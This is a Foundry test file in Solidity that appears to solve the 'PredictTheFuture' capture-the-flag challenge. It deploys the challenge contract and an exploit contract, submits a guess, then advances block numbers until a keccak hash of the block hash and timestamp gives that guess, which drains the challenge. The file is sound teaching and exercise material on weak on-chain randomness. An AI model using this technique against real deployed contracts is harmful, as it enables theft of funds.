// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        uint256 startBlock = 104293;
        vm.roll(startBlock);
        vm.warp(93582192);

        // Put your solution here
        exploitContract.attackGuess{value: 1 ether}();

        while (0 != (uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10)) {
            startBlock += 2;
            vm.roll(startBlock);
        }
        exploitContract.attackSettle();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
